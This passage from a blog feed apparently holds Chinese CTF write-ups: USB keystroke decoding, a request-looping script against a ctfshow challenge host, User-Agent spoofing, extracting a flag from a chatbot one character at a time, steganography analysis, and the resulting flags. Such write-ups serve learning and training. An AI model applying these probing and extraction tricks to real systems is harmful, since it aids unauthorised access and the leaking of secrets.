class="hljs-keyword">or</span> line[<span class="hljs-number">9</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">10</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">12</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">13</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">15</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">16</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">18</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">19</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">21</span>]!=<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">or</span> line[<span class="hljs-number">22</span>]!=<span class="hljs-string">&#x27;0&#x27;</span>:<br>         <span class="hljs-keyword">continue</span><br>    nums.append(<span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>],<span class="hljs-number">16</span>))<br><br>keys.close()<br><br>output = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> nums:<br>    <span class="hljs-keyword">if</span> n == <span class="hljs-number">0</span> :<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> n <span class="hljs-keyword">in</span> mappings:<br>        output += mappings[n]<br>    <span class="hljs-keyword">else</span>:<br>        output += <span class="hljs-string">&#x27;[unknown]&#x27;</span><br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;output :\n&#x27;</span> + output<br></code></pre></td></tr></table></figure><p>运行脚本得到：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">output :<br>666C61677B3866396564326639333365662[DEL]31346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>因为[DEL]是删除键，所以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666C61677B38663965643266393333656631346138643035323364303334396531323939637D<br></code></pre></td></tr></table></figure><p>使用脚本将十六进制转换为字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">m=<span class="hljs-string">&quot;666C61677B38663965643266393333656631346138643035323364303334396531323939637D&quot;</span><br>s=bytes.fromhex(m)<br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">b<span class="hljs-string">&#x27;flag&#123;8f9ed2f933ef14a8d0523d0349e1299c&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="ctfshow渔人杯"><a href="#ctfshow渔人杯" class="headerlink" title="ctfshow渔人杯"></a>ctfshow渔人杯</h1><h2 id="签到抽奖"><a href="#签到抽奖" class="headerlink" title="签到抽奖"></a>签到抽奖</h2><p><img src="https://img-blog.csdnimg.cn/20210404122728247.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">中文也可能是英文及其他小众语言字符<br></code></pre></td></tr></table></figure><h2 id="感受下气氛"><a href="#感受下气氛" class="headerlink" title="感受下气氛"></a>感受下气氛</h2><p>flag是ctfshow{[0-9]{9}}</p><p>正则匹配，符合条件的都可以，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;123456789&#125;<br></code></pre></td></tr></table></figure><h2 id="神仙姐姐"><a href="#神仙姐姐" class="headerlink" title="神仙姐姐"></a>神仙姐姐</h2><p><img src="https://img-blog.csdnimg.cn/20210404123026959.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击拜，抓包<br><img src="https://img-blog.csdnimg.cn/20210404123102170.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传参num进行爆破，根据提示num在1-1000内<br><img src="https://img-blog.csdnimg.cn/20210404125742649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>都是假flag，一直往下翻<br><img src="https://img-blog.csdnimg.cn/20210404124738984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>编写脚本进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url=<span class="hljs-string">&quot;http://f0c222a9-04f2-431b-ae2b-56e871f6b61b.challenge.ctf.show:8080/sx.php&quot;</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;PHPSESSID=gmnu9pfgh503imv66a9tk37ke2&quot;</span><br>&#125;<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    response=requests.get(url, headers=headers);<br>    print(responsea.text)<br></code></pre></td></tr></table></figure><p>得到flag<br><img src="https://img-blog.csdnimg.cn/20210404131900210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="阿拉丁"><a href="#阿拉丁" class="headerlink" title="阿拉丁"></a>阿拉丁</h2><p>想要啥就有啥</p><p>好家伙，怎么不给flag，不是说想要啥就有啥吗？<br><img src="https://img-blog.csdnimg.cn/20210404132911508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续问，还是没有<br><img src="https://img-blog.csdnimg.cn/20210404133231967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>burp抓包也看不出什么，看了其他师傅的wp，可以直接问flag每一位是什么？，我直接好家伙，这也行。<br><img src="https://img-blog.csdnimg.cn/20210404133052347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>总共45位<br><img src="https://img-blog.csdnimg.cn/20210404134253711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>拼接起来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;a15b2830-dcf4-4344-99e5-350a561cbf89&#125;<br></code></pre></td></tr></table></figure><h2 id="迷"><a href="#迷" class="headerlink" title="迷"></a>迷</h2><p><img src="https://img-blog.csdnimg.cn/20210404135014838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>访问靶机地址<br><img src="https://img-blog.csdnimg.cn/20210404135001556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>有一个登录框，还以为是sql注入，看了群里说直接访问/flag<br><img src="https://img-blog.csdnimg.cn/20210404135103522.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>是菜蒙蔽了我的双眼，做个题还被嘲讽了<br><img src="https://img-blog.csdnimg.cn/20210404135150921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="飘啊飘"><a href="#飘啊飘" class="headerlink" title="飘啊飘"></a>飘啊飘</h2><p>题目描述：有手X就行</p><p>抓包，伪装请求头<code>User-Agent: Android</code>，状态码302重定向，发现了mb.html<br><img src="https://img-blog.csdnimg.cn/20210405171746862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接访问mb.html<br><img src="https://img-blog.csdnimg.cn/20210405172008540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="简单二维码"><a href="#简单二维码" class="headerlink" title="简单二维码"></a>简单二维码</h2><p>下载附件，一个png图片和一个“wp”，两个假flag。<br><img src="https://img-blog.csdnimg.cn/2021040414094950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用stegsolve进行异或，发现一张二维码<br><img src="https://img-blog.csdnimg.cn/20210404141133808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>扫码，还是假flag<br><img src="https://img-blog.csdnimg.cn/20210404141301883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>继续异或，还是迷惑信息<br><img src="https://img-blog.csdnimg.cn/20210404141503298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>勾选最低通道，依旧是假flag<br><img src="https://img-blog.csdnimg.cn/20210404142416970.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>点击Analyse，选择Steregram Sover进行左右偏移<br><img src="https://img-blog.csdnimg.cn/2021040414211853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>终于找到了真flag，颈椎治疗，哈哈哈</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ctfshow&#123;Jing_Zhui_Zhi_Liao&#125;<br></code></pre></td></tr></table></figure><h2 id="我跟你拼了"><a href="#我跟你拼了" class="headerlink" title="我跟你拼了"></a>我跟你拼了</h2><p>狸题，下载附件ttt.png和mask.png<img src="https://img-blog.csdnimg.cn/20210404142546734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我傻乎乎的在那拼图，看了wp原来直接修改图片高度就行了，666，果然狸题就是离谱<br><img src="https://img-blog.csdnimg.cn/20210404143008250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>参考文章：<br><a href="https://l1near.top/index.php/2021/04/03/100.html">首届“红明谷”杯技能场景赛MISC_WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：记录最近几场比赛的赛后复现&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    <category term="比赛复现" scheme="https://swhat.github.io/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="https://swhat.github.io/tags/Write-up/"/>
    
  </entry>
  
</feed>
